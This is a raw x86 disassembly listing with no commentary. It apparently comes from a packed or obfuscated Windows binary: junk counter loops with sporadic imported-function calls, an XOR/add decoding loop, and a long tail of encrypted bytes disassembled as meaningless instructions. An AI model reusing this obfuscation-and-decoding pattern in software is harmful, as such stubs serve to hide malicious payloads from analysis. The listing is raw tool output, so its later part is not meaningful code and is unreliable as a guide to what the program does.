  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x94,al
  41049c:	imul   ebx,DWORD PTR ds:0x7eb0dc12,0x7e7caf7e
  4104a6:	jle    0x41049c
  4104a8:	cs sar edx,1
  4104ab:	xor    al,0xcd
  4104ad:	daa    
  4104ae:	add    DWORD PTR [edi],0xdd281968
  4104b4:	outs   dx,DWORD PTR ds:[esi]
  4104b5:	test   eax,0xfc9d37fa
  4104ba:	not    DWORD PTR [edx]
  4104bc:	sbb    esi,eax
  4104be:	push   0x65
  4104c0:	inc    ebx
  4104c1:	xchg   DWORD PTR [edx],ebp
  4104c3:	pusha  
  4104c4:	cmp    edi,DWORD PTR [edi]
  4104c6:	cwde   
  4104c7:	ins    BYTE PTR es:[edi],dx
  4104c8:	mov    WORD PTR [edi-0x502c4abd],?
  4104ce:	in     eax,0xc8
  4104d0:	sbb    dh,bl
  4104d2:	push   ds
  4104d3:	push   edi
  4104d4:	or     al,0x47
  4104d6:	scas   eax,DWORD PTR es:[edi]
  4104d7:	das    
  4104d8:	pusha  
  4104d9:	hlt    
  4104da:	aas    
  4104db:	je     0x410509
  4104dd:	jmp    0x3bccabd1
  4104e2:	enter  0x5200,0xb1
  4104e6:	adc    dh,BYTE PTR [edx]
  4104e8:	adc    ebx,esp
  4104ea:	and    BYTE PTR [ebx-0x68fb37e4],dh
  4104f0:	mov    esi,0xf1c6a785
  4104f5:	js     0x4104a2
  4104f7:	inc    ebx
  4104f8:	inc    esi
  4104f9:	xchg   edi,eax
  4104fa:	inc    ebp
  4104fb:	or     eax,0xa470d6b3
  410500:	mov    edx,ebp
  410502:	mov    ah,0x66
  410504:	ins    DWORD PTR es:[edi],dx
  410505:	in     al,0x34
  410507:	dec    edx
  410508:	push   ebx
  410509:	inc    edx
  41050a:	mov    WORD PTR [ebp-0x79],gs
  41050d:	jp     0x41055a
  41050f:	jge    0x410507
  410511:	es data16 and al,0xb8
  410515:	mov    ebx,eax
  410517:	inc    edi
  410518:	in     eax,0x6
  41051a:	adc    al,0x47
  41051c:	je     0x41058a
  41051e:	mov    cl,0xd4
  410520:	lock add DWORD PTR [ebx-0xc],edi
  410524:	(bad)  
  410525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410526:	(bad)  
  410527:	in     eax,0x37
  410529:	dec    eax
  41052a:	retf   
  41052b:	sbb    BYTE PTR [eax*4+0x4b92d9a9],dh
  410532:	stos   BYTE PTR es:[edi],al
  410533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410534:	jmp    0x6ccb6603
  410539:	cwde   
  41053a:	cmovge edx,DWORD PTR [ecx+eax*4]
  41053e:	and    cl,ch
  410540:	mov    dl,0x16
  410542:	push   esi
  410543:	ds sti 
  410545:	retf   
  410546:	pop    es
  410547:	inc    ebp
  410548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410549:	dec    esi
  41054a:	fcmovnb st,st(7)
  41054c:	popf   
  41054d:	sub    eax,0x39614e07
  410552:	adc    eax,0x4b873633
  410557:	jnp    0x4105af
  410559:	icebp  
  41055a:	leave  
  41055b:	xor    cl,BYTE PTR [ecx-0x26]
  41055e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41055f:	js     0x410535
  410561:	mov    bl,0x84
  410563:	mov    bl,0x39
  410565:	es dec ebx
  410567:	add    DWORD PTR [edi+0x62dc2132],esp
  41056d:	mov    ecx,0xfcb89236
  410572:	add    edi,DWORD PTR [eax]
  410574:	cdq    
  410575:	ss mov dl,0xfc
  410578:	fucomip st,st(6)
  41057a:	jmp    0x3ea5:0x481a5c92
  410581:	mov    esp,0xc173b2e
  410586:	sbb    ebp,ecx
  410588:	mov    bh,BYTE PTR [ebx+0x62]
  41058b:	test   esi,ebp
  41058d:	push   ecx
  41058e:	test   al,0xe1
  410590:	data16 jmp 0x410564
  410593:	dec    ebx
  410594:	add    al,0xb0
  410596:	cmp    DWORD PTR [ebp-0x3],ebx
  410599:	jbe    0x410593
  41059b:	mov    eax,0xa95357
  4105a0:	or     bl,ah
  4105a2:	jp     0x410603
  4105a4:	jp     0x41057c
  4105a6:	dec    esi
  4105a7:	xor    eax,0xc644cc67
  4105ac:	sub    esi,esi
  4105ae:	inc    ecx
  4105af:	push   ebx
  4105b0:	sub    BYTE PTR [ecx],bh
  4105b2:	test   dh,0xcf
  4105b5:	div    BYTE PTR [ebx+0x42]
  4105b8:	jne    0x410563
  4105ba:	pop    esp
  4105bb:	or     DWORD PTR [ebx],0x1d
  4105be:	and    eax,0xad22f086
  4105c3:	bound  eax,QWORD PTR [edx+0x21c2e379]
  4105c9:	fwait
  4105ca:	(bad)  
  4105cb:	iret   
  4105cc:	or     esi,DWORD PTR [edx+0x13]
  4105cf:	popf   
  4105d0:	dec    esi
  4105d1:	into   
  4105d2:	jnp    0x4105f1
  4105d4:	sub    ecx,DWORD PTR [ebp+0x62ca4b0e]
  4105da:	repz rcr DWORD PTR [edx],1
  4105dd:	(bad)  
  4105df:	lods   al,BYTE PTR ds:[esi]
  4105e0:	sub    al,0x6c
  4105e2:	out    0xa1,eax
  4105e4:	xor    DWORD PTR [eax-0x7624be7b],eax
  4105ea:	or     eax,0x75e74856
  4105ef:	shr    BYTE PTR [ebp+0x19f7a6c2],cl
  4105f5:	inc    edi
  4105f6:	and    ebx,DWORD PTR [esi]
  4105f8:	jl     0x4105d3
  4105fa:	ficomp DWORD PTR [edi-0x26]
  4105fd:	retf   0x86c0
  410600:	mov    edi,DWORD PTR [esi+esi*8-0x72]
  410604:	test   BYTE PTR [ebx+0x53],0xfc
  410608:	inc    ebx
  410609:	dec    edx
  41060a:	out    dx,eax
  41060b:	mov    ds:0x7359bde4,eax
  410611:	push   ecx
  410612:	in     al,dx
  410613:	mov    ah,0x2a
  410615:	adc    DWORD PTR [edi-0x7f1a406f],esp
  41061b:	push   0x1bb4ad4b
  410620:	add    ah,BYTE PTR [ebx+0x3b]
  410623:	push   ebp
  410624:	pop    esi
  410625:	and    DWORD PTR [esi+0x54],esi
  410628:	push   ebp
  410629:	ret    
  41062a:	add    bl,BYTE PTR [ebx+0x1]
  41062d:	cmc    
  41062e:	jmp    0xaf12f5f4
  410633:	jns    0x410664
  410635:	mov    cl,0xb0
  410637:	lahf   
  410638:	fistp  QWORD PTR [ebp+0x7015935b]
  41063e:	popa   
  41063f:	sub    al,0x6e
  410641:	inc    edi
  410642:	int3   
  410643:	jp     0x4105c8
  410645:	(bad)  
  410646:	cdq    
  410647:	(bad)  
  410649:	mov    dl,0x39
  41064b:	inc    ebp
  41064c:	ror    BYTE PTR [ebx+0x5aa27b97],1
  410652:	aad    0xce
  410654:	gs adc eax,0xd62b5f29
  41065a:	call   0xb752:0x97c52209
  410661:	xchg   BYTE PTR es:[edx+0x37],bl
  410665:	push   0xfffffffe
  410667:	push   eax
  410668:	sbb    cl,dh
  41066a:	and    al,0xc1
  41066c:	bound  ebp,QWORD PTR fs:[esi+0x70]
  410670:	scas   al,BYTE PTR es:[edi]
  410671:	dec    edi
  410672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410673:	push   ds
  410674:	push   ebp
  410675:	fs push ebp
  410677:	mov    esi,0xd089c8ee
  41067c:	sub    eax,0x90492d0c
  410681:	int3   
  410682:	lods   eax,DWORD PTR ds:[esi]
  410683:	imul   ebp,eax,0xffffffa6
  410686:	jae    0x4106ed
  410688:	js     0x41065c
  41068a:	pop    esp
  41068b:	mov    eax,ds:0x2ea6363b
  410690:	pusha  
  410691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410692:	xor    bh,bh
  410694:	mov    WORD PTR [esi-0x5],es
  410697:	xor    DWORD PTR gs:[edi],0x24
  41069b:	sbb    eax,0xf1d635c1
  4106a0:	jne    0x41067a
  4106a2:	in     al,0x57
  4106a4:	add    al,bh
  4106a6:	outs   dx,DWORD PTR ds:[esi]
  4106a7:	cmp    BYTE PTR [ebx-0x1e],bh
  4106aa:	sbb    eax,DWORD PTR [eax+0x14]
  4106ad:	shl    BYTE PTR [ebp-0x30],cl
  4106b0:	js     0x410684
  4106b2:	sti    
  4106b3:	shl    eax,1
  4106b5:	repnz in eax,dx
  4106b7:	dec    ecx
  4106b8:	mov    ebp,0x33111350
  4106bd:	(bad)  
  4106be:	or     edi,esi
  4106c0:	jmp    0x410712
  4106c2:	mov    bh,0x47
  4106c4:	aas    
  4106c5:	add    al,0x66
  4106c7:	fild   WORD PTR [esi]
  4106c9:	xchg   DWORD PTR [edi-0x2],ebp
  4106cc:	mov    dl,BYTE PTR [esi-0x50]
  4106cf:	xor    esp,DWORD PTR [ebp+ebp*4+0x3676a906]
  4106d6:	push   edi
  4106d7:	(bad)  
  4106d8:	imul   edi,DWORD PTR [esi],0x5f
  4106db:	add    al,0xe3
  4106dd:	push   ss
  4106de:	fwait
  4106df:	cli    
  4106e0:	pushf  
  4106e1:	jns    0x4106fc
  4106e3:	and    eax,0x6a30f398
  4106e8:	ss pop es
  4106ea:	fcomp  st(7)
  4106ec:	jbe    0x410708
  4106ee:	loope  0x410759
  4106f0:	cmp    DWORD PTR [edx+eiz*2+0x7cf0ddf3],esi
  4106f7:	push   esp
  4106f8:	jns    0x410725
  4106fa:	fdivr  DWORD PTR [edx-0x2201d256]
  410700:	lds    edi,FWORD PTR [eax+0x21]
  410703:	mov    cl,0x9a
  410705:	pop    edx
  410706:	in     al,0xc7
  410708:	mov    BYTE PTR [edi+0x4e6dfd34],al
  41070e:	mov    ch,0xdb
  410710:	loope  0x41078a
  410712:	sbb    ebp,DWORD PTR [edi]
  410714:	cdq    
  410715:	jno    0x4106da
  410717:	adc    DWORD PTR [ecx+0x1f56ca7e],edi
  41071d:	push   0x64
  41071f:	push   ss
  410720:	cmp    ebp,esp
  410722:	aas    
  410723:	or     ebx,esi
  410725:	scas   eax,DWORD PTR es:[edi]
  410726:	pop    ds
  410727:	jp     0x4106e6
  410729:	adc    eax,DWORD PTR [edi-0x77]
  41072c:	cmp    BYTE PTR [eax-0x28],cl
  41072f:	pop    esp
  410730:	fisub  WORD PTR [edx+ebp*4]
  410733:	inc    ebx
  410734:	or     edx,edi
  410736:	retf   
  410737:	pop    esp
  410738:	push   ss
  410739:	outs   dx,BYTE PTR ds:[esi]
  41073a:	into   
  41073b:	les    esi,FWORD PTR [edx-0x46]
  41073e:	dec    esi
  41073f:	nop
  410740:	inc    ebx
  410741:	sub    eax,0x9b006bab
  410746:	xchg   edi,eax
  410747:	dec    ecx
  410748:	jge    0x41074a
  41074a:	jge    0x410731
  41074c:	mov    edx,0xf9197650
  410751:	mov    ah,0x6b
  410753:	cwde   
  410754:	mov    dh,0x55
  410756:	hlt    
  410757:	lods   al,BYTE PTR ds:[esi]
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x898490df
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107a8
  41078c:	push   edi
  41078d:	dec    edi
  41078e:	pop    es
  41078f:	repz mov al,ds:0x9b140129
  410795:	mov    eax,0xbf68fa77
  41079a:	mov    bh,0x24
  41079c:	cmc    
  41079d:	xchg   ebx,eax
  41079e:	dec    ebx
  41079f:	data16 test BYTE PTR [ecx+0x64],ch
  4107a3:	add    DWORD PTR [edi],0xbb005717
  4107a9:	call   0x7659:0xc86d38df
  4107b0:	clc    
  4107b1:	xchg   ebp,eax
  4107b2:	push   esi
  4107b3:	push   ebp
  4107b4:	cwde   
  4107b5:	pop    ss
  4107b6:	xchg   ebp,eax
  4107b7:	jle    0x410833
  4107b9:	cmp    dl,al
  4107bb:	xor    esi,edi
  4107bd:	pop    ss
  4107be:	shr    DWORD PTR [edx-0x34],0x85
  4107c2:	out    dx,al
  4107c3:	mov    ebx,0xef9d985a
  4107c8:	mov    ds,WORD PTR [edx+0x15]
  4107cb:	adc    edi,ecx
  4107cd:	cmp    eax,0x1edeb256
  4107d2:	push   eax
  4107d3:	xchg   BYTE PTR [edi-0x75a5f498],al
  4107d9:	inc    edx
  4107da:	ret    
  4107db:	stc    
  4107dc:	adc    BYTE PTR [ebx+0x1c],0x1a
  4107e0:	fcmovu st,st(6)
  4107e2:	adc    BYTE PTR [ebx+0x76],bl
  4107e5:	ss (bad) 
  4107e8:	and    DWORD PTR [ebx],0xffffffe4
  4107eb:	add    al,cl
  4107ed:	or     al,0x4a
  4107ef:	jle    0x41084b
  4107f1:	rol    dh,0xf
  4107f4:	rcr    BYTE PTR [edi+0x7a7dbce3],0xfd
  4107fb:	repnz fucomi st,st(6)
  4107fe:	push   esp
  4107ff:	mov    dh,0x3d
  410801:	outs   dx,BYTE PTR ds:[esi]
  410802:	sbb    dl,BYTE PTR [edx]
  410804:	aaa    
  410805:	clc    
  410806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410807:	dec    ebp
  410808:	adc    al,0xdc
  41080a:	jnp    0x410879
  41080c:	aas    
  41080d:	dec    ebp
  41080e:	and    DWORD PTR [eax],esp
  410810:	xlat   BYTE PTR ds:[ebx]
  410811:	in     al,0xee
  410813:	push   eax
  410814:	cmc    
  410815:	out    0x1e,eax
  410817:	test   eax,0xf67e907f
  41081c:	mov    esi,0xcfb74900
  410821:	sub    al,bl
  410823:	int3   
  410824:	or     al,0x88
  410826:	aaa    
  410827:	in     eax,dx
  410828:	pusha  
  410829:	out    0xbb,al
  41082b:	jns    0x410851
  41082d:	gs out dx,eax
  41082f:	xchg   edx,ebx
  410831:	sub    BYTE PTR [esi-0x3c],bh
  410834:	cmp    BYTE PTR [eax+0x8],0x12
  410838:	xor    DWORD PTR [edx],0x7c
  41083b:	mov    ebx,edx
  41083d:	in     eax,dx
  41083e:	mov    eax,ds:0x29fe2eee
  410843:	push   0x3dab27b
  410848:	ret    
  410849:	pop    ebx
  41084a:	cmp    ah,dh
  41084c:	sub    DWORD PTR [ebp-0x5bea613a],esi
  410852:	xchg   edi,eax
  410853:	push   edx
  410854:	fsqrt  
  410856:	ficom  DWORD PTR [ebp+0x38]
  410859:	push   es
  41085a:	ror    DWORD PTR [ecx+esi*1-0x2e74454a],0x73
  410862:	sub    BYTE PTR [edi-0x204c7ca],dl
  410868:	ret    0xfc46
  41086b:	stos   BYTE PTR es:[edi],al
  41086c:	retf   
  41086d:	xor    eax,0x47fba4f0
  410872:	aad    0x59
  410874:	(bad)  [edx+0x2640befd]
  41087a:	loop   0x4108aa
  41087c:	cli    
  41087d:	mov    edx,DWORD PTR [edx+0xd9049ba]
  410883:	push   esp
  410884:	stos   DWORD PTR es:[edi],eax
  410885:	jno    0x4108fe
  410887:	cmp    BYTE PTR [esp+ecx*4+0x6e],al
  41088b:	push   edi
  41088c:	sub    dh,bh
  41088e:	push   eax
  41088f:	div    DWORD PTR ds:0x6ea3e904
  410895:	test   BYTE PTR [eax+0x55],cl
  410898:	or     eax,0x628f942c
  41089d:	and    ch,dh
  41089f:	jno    0x410862
  4108a1:	daa    
  4108a2:	xor    eax,0x5747f08c
  4108a7:	test   DWORD PTR [ecx+0x46eb7826],ecx
  4108ad:	in     al,dx
  4108ae:	fcmovb st,st(3)
  4108b0:	cmp    esp,ebp
  4108b2:	inc    ecx
  4108b3:	inc    ebp
  4108b4:	inc    edi
  4108b5:	push   0xc4016d95
  4108ba:	mov    ah,0x89
  4108bc:	jns    0x410860
  4108be:	dec    ecx
  4108bf:	inc    ebx
  4108c0:	push   DWORD PTR [edx]
  4108c2:	stc    
  4108c3:	mov    bh,BYTE PTR [ecx+0x25]
  4108c6:	inc    esi
  4108c7:	ja     0x4108f4
  4108c9:	xchg   ebx,eax
  4108ca:	xor    ah,BYTE PTR [eax+0x2b7e4d4]
  4108d0:	jb     0x4108da
  4108d2:	xchg   ebx,eax
  4108d3:	bound  ecx,QWORD PTR [eax+0x52ed28a8]
  4108d9:	stc    
  4108da:	cmp    eax,0xbcdfbbda
  4108df:	and    DWORD PTR [ebx-0x6eedd7d8],ebx
  4108e5:	gs cmp ch,dl
  4108e8:	pop    edi
  4108e9:	inc    ebp
  4108ea:	loopne 0x410926
  4108ec:	clc    
  4108ed:	jp     0x4108c7
  4108ef:	(bad)  
  4108f0:	xlat   BYTE PTR ds:[ebx]
  4108f1:	cmp    DWORD PTR [esp+ecx*4-0x35],ebp
  4108f5:	inc    esp
  4108f6:	mov    bh,BYTE PTR [ebx+0x76489fe7]
  4108fc:	mov    dh,0x86
  4108fe:	scas   ax,WORD PTR es:[edi]
  410900:	cmp    BYTE PTR [ecx],bl
  410902:	dec    esp
  410903:	xchg   edx,eax
  410904:	jmp    0x9727:0x941e756
  41090b:	xchg   esi,eax
  41090c:	dec    eax
  41090d:	jmp    0xe176:0x87274cdd
  410914:	push   0xffffffad
  410916:	jne    0x4108a6
  410918:	jge    0x4108d8
  41091a:	mov    eax,DWORD PTR [edx+0x37]
  41091d:	pop    ebx
  41091e:	stos   DWORD PTR es:[edi],eax
  41091f:	test   DWORD PTR cs:[esi+0x1d404442],eax
  410926:	jb     0x410927
  410928:	shl    esi,0x25
  41092b:	mov    BYTE PTR [edx-0x75fde776],al
  410931:	mov    esi,0x55580729
  410936:	xchg   edx,eax
  410937:	xchg   ebp,eax
  410938:	mov    al,0x8f
  41093a:	mov    ds:0x7a2ffebf,eax
  41093f:	nop
  410940:	(bad)  
  410941:	popa   
  410942:	out    0xe6,eax
  410944:	sub    al,0x87
  410946:	mov    eax,ds:0x55146c65
  41094b:	jge    0x4109b7
  41094d:	add    cl,BYTE PTR [ecx-0x47a336a1]
  410953:	jbe    0x4109c5
  410955:	jp     0x41091e
  410957:	(bad)  
  410958:	repnz adc ebx,ecx
  41095b:	scas   eax,DWORD PTR es:[edi]
  41095c:	and    DWORD PTR [ebp+0x5c],0x5f0fd0b
  410963:	xchg   BYTE PTR fs:[ebx-0x57],bl
  410967:	ss mov bl,0xe
  41096a:	ret    0x7735
  41096d:	(bad)  
  41096e:	fcom   st(2)
  410970:	shr    BYTE PTR [esi-0x44eeea38],cl
  410976:	jmp    0xdcbaaf93
  41097b:	(bad)  
  41097c:	cmp    ah,BYTE PTR [ebx-0x547a9456]
  410982:	out    0x8a,al
  410984:	aam    0xe8
  410986:	push   ebx
  410987:	sar    BYTE PTR [ecx],0xb6
  41098a:	xchg   esp,eax
  41098b:	cmp    DWORD PTR [ebx+0x46],esp
  41098e:	int    0xc1
  410990:	xor    ah,BYTE PTR [ecx-0x1e]
  410993:	(bad)  
  410994:	call   0x2239557e
  410999:	push   cs
  41099a:	mov    bh,0x25
  41099c:	mov    ds:0xfce62c9d,al
  4109a1:	mov    BYTE PTR [edx-0x3b],0xf6
  4109a5:	push   eax
  4109a6:	xchg   ebx,eax
  4109a7:	and    al,BYTE PTR [esi+0x3848e76f]
  4109ad:	jl     0x4109d9
  4109af:	sub    cl,BYTE PTR [eax+ebp*8-0x32]
  4109b3:	xchg   ebp,eax
  4109b4:	pop    esi
  4109b5:	ins    BYTE PTR es:[edi],dx
  4109b6:	pop    esi
  4109b7:	pop    edi
  4109b8:	mov    bl,0xb1
  4109ba:	jl     0x410a19
  4109bc:	lock dec ecx
  4109be:	dec    edi
  4109bf:	xor    eax,DWORD PTR [ebx+0x33]
  4109c2:	sub    BYTE PTR [edi+0x1c],0x4a
  4109c6:	mov    ecx,0x99de0cd3
  4109cb:	push   ds
  4109cc:	fist   WORD PTR [ebx-0x1d]
  4109cf:	or     DWORD PTR [esi+ebp*1-0x496a57df],ebx
  4109d6:	les    edx,FWORD PTR [edx+0x53d5a5cc]
  4109dc:	bswap  ecx
  4109de:	rcr    DWORD PTR [edx-0x2bcec847],0xb1
  4109e5:	mov    ebp,0xcf7ce55e
  4109ea:	mov    ah,0xe8
  4109ec:	push   esi
  4109ed:	scas   eax,DWORD PTR es:[edi]
  4109ee:	into   
  4109ef:	adc    eax,0x4aae5215
  4109f4:	push   edx
  4109f5:	rol    ah,0x66
  4109f8:	adc    ah,BYTE PTR [esi+0x40da50f]
  4109fe:	rcl    DWORD PTR [ebp-0x760595f2],cl
  410a04:	mov    bl,0x5d
  410a06:	rcl    ecx,1
  410a08:	(bad)  
  410a09:	in     al,0x87
  410a0b:	nop
  410a0c:	mov    WORD PTR [ebx],ss
  410a0e:	jo     0x4109c7
  410a10:	jo     0x4109bc
  410a12:	js     0x410a50
  410a14:	add    dl,BYTE PTR [ecx+0x73f5acb5]
  410a1a:	add    BYTE PTR [edx],bh
  410a1c:	popf   
  410a1d:	add    dh,BYTE PTR [eax+eax*4+0x5a]
  410a21:	out    dx,eax
  410a22:	out    dx,al
  410a23:	shl    BYTE PTR [eax-0x78],1
  410a26:	sbb    BYTE PTR [ebx],al
  410a28:	pop    esi
  410a29:	call   0xbb2e6deb
  410a2e:	pop    ss
  410a2f:	mov    ds:0x8f151b6e,al
  410a34:	sahf   
  410a35:	repnz pop edi
  410a37:	aaa    
  410a38:	mov    dh,0xc2
  410a3a:	mov    ecx,0xe9c60349
  410a3f:	leave  
  410a40:	add    al,BYTE PTR [eax]
  410a42:	add    BYTE PTR [edx],al
  410a44:	xor    ah,BYTE PTR [esp+ebx*8+0x74]
  410a48:	push   0xc758f082
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	sbb    DWORD PTR [esi-0x27],esi
  410a52:	pop    ss
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a56
  410a5c:	mov    ax,ds:0x6a88b5d4
  410a62:	ss inc edi
  410a64:	sub    DWORD PTR [eax],edx
  410a66:	push   edx
  410a67:	mov    dl,0x34
  410a69:	xor    DWORD PTR [edi+edx*1-0x5d],ebp
  410a6d:	sbb    al,0xa4
  410a6f:	sbb    DWORD PTR [eax],ecx
  410a71:	adc    ah,BYTE PTR [ecx+ebx*1-0x2c442919]
  410a78:	hlt    
  410a79:	arpl   WORD PTR [esi+0x2174c572],sp
  410a7f:	enter  0x7596,0xaf
  410a83:	jnp    0x410a90
  410a85:	mov    WORD PTR [edx+ebx*8+0x61],ds
  410a89:	mov    al,0x3d
  410a8b:	and    edi,DWORD PTR [edi-0x257cc686]
  410a91:	mov    ch,0xd
  410a93:	test   BYTE PTR [eax],dl
  410a95:	inc    ecx
  410a96:	retf   0x269c
  410a99:	cwde   
  410a9a:	cli    
  410a9b:	pop    esp
  410a9c:	das    
  410a9d:	dec    esi
  410a9e:	test   bl,dh
  410aa0:	pop    esp
  410aa1:	pop    esp
  410aa2:	daa    
  410aa3:	(bad)  
  410aa4:	clc    
  410aa5:	not    DWORD PTR [esi]
  410aa7:	mov    ah,0xb6
  410aa9:	adc    al,0xd4
  410aab:	dec    ebx
  410aac:	cmc    
  410aad:	cdq    
  410aae:	sub    DWORD PTR [ecx+0x36],ebp
  410ab1:	out    dx,eax
  410ab2:	mov    DWORD PTR [edx+0x4336335e],0x355de770
  410abc:	js     0x410b19
  410abe:	and    DWORD PTR cs:[edi+0x78f2c15e],0x3
  410ac6:	cmp    eax,0x6526b473
  410acb:	fcomip st,st(1)
  410acd:	aas    
  410ace:	and    BYTE PTR [ebx+0x5b],cl
  410ad1:	pop    esi
  410ad2:	popf   
  410ad3:	pop    es
  410ad4:	cld    
  410ad5:	xchg   ecx,eax
  410ad6:	jns    0x410a97
  410ad8:	shl    BYTE PTR [edx+ebp*4],1
  410adb:	push   ss
  410adc:	push   ds
  410add:	jge    0x410ae2
  410adf:	fwait
  410ae0:	(bad)
  410ae3:	mov    al,ds:0x70e72a71
  410ae8:	js     0x410a77
  410aea:	es push eax
  410aec:	sub    cl,BYTE PTR [esi]
  410aee:	sub    BYTE PTR [eax-0x6f],al
  410af1:	jp     0x410b49
  410af3:	stos   BYTE PTR es:[edi],al
  410af4:	add    bl,bl
  410af6:	icebp  
  410af7:	pop    edx
  410af8:	push   0xffffffd4
  410afa:	pop    ecx
  410afb:	inc    ecx
  410afc:	aad    0x3
  410afe:	ret    
  410aff:	fst    DWORD PTR [eax-0x46]
  410b02:	ds push ecx
  410b04:	sub    eax,0x365f47be
  410b09:	ins    BYTE PTR es:[edi],dx
  410b0a:	fisubr DWORD PTR [esp+edx*4-0x60cd8625]
  410b11:	pop    ebx
  410b12:	pop    edi
  410b13:	data16 sub ch,bh
  410b16:	stos   DWORD PTR es:[edi],eax
  410b17:	loopne 0x410b3a
  410b19:	test   ebp,0x46b6359e
  410b1f:	add    al,0x8e
  410b21:	adc    BYTE PTR [ebp-0x1bc9157a],cl
  410b27:	mov    dh,0xfc
  410b29:	repz mov edx,0x7bc3cd1c
  410b2f:	rcr    BYTE PTR [esi+0x8],0xf1
  410b33:	sub    dh,BYTE PTR [eax]
  410b35:	mov    bh,BYTE PTR [esi-0x53825cf3]
  410b3b:	jno    0x410b19
  410b3d:	mov    DWORD PTR [eax-0x22],ebx
  410b40:	xchg   ecx,eax
  410b41:	or     DWORD PTR [ebp-0x5f],esi
  410b44:	push   es
  410b45:	test   al,0x6c
  410b47:	aaa    
  410b48:	das    
